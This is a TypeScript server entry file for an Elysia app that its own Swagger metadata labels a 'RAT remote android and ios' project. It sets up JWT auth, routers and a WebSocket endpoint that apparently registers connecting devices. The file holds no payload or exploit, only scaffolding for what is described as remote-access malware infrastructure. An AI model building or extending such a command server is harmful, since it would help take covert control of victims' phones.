import { Elysia, t } from "elysia";
import { swagger } from '@elysiajs/swagger';
import { cors } from '@elysiajs/cors';
import { helmet } from 'elysia-helmet';
import { jwt } from '@elysiajs/jwt';
import { logger } from '@grotto/logysia';
import { v4 } from 'uuid';
// import './config/mongo';

import { isAuthenticatedHttp, isAuthenticatedWS } from './middleware/jwt';
// Routers
import authRouter from './modules/auth';
import userRouter from './modules/user';

// Ws
import ClientHandle from "./ws/clientHandle";
import ClientConnectionManager from "./ws/clientConnectionManager";

const clientConnectionManager = new ClientConnectionManager();

const app = new Elysia()
  .use(swagger({
    documentation: {
      info: {
        title: "RAT Cypher Company",
        version: '1.0.0',
        contact: {
          name: '@kohdev',
          url: 'https://t.me/kohdev'
        },
        description: "RAT remote android and ios",
        license: {
          name: "MIT"
        }
      }
    },
    version: '1.0.0'
  }))
  .use(cors(/* your options */))
  .use(helmet({ /* your options */ }))
  .use(logger())
  .use(
    jwt({
      name: 'jwt',
      secret: process.env.JWT_SECRET,
    })
  )
  .get('/', () => {
    return `Elysia is running at ${app.server?.hostname}:${app.server?.port}`;
  })
  // ws dùng hệ thống auth riêng nên không phải đặt trước onBeforeHandle auth của http
  .ws('/ws', {
    body: t.Object({
      type: t.Optional(t.String()),
      content: t.Optional(t.Any()),
    }),
    open: (ws) => {
      const idSocket = v4();
      const clientHandle = new ClientHandle(idSocket, clientConnectionManager);
      clientHandle.initialize(ws);
      clientConnectionManager.addClient(idSocket, clientHandle);
      ws.data.store.clientHandle = clientHandle;
    },
    close: (ws) => {
      ws.data.store.clientHandle.handleClientDisconnection();
    },
    message(ws, message) {
      ws.data.store.clientHandle.handleClientMessage(message);
    },
    response: t.String(),
    maxPayloadLength: 1024 * 1024, // 1 MB
    // beforeHandle: ({ headers, jwt, set, store }) => isAuthenticatedWS({ headers, jwt, set, store }),
  })
  // không auth
  .use(authRouter)
  // auth middleware
  .onBeforeHandle(isAuthenticatedHttp)
  // từ router này về sau sẽ được auth
  .use(userRouter)
  .listen(process.env.PORT_SERVER);

console.log(
  `🦊 Elysia is running at ${app.server?.hostname}:${app.server?.port}`
);
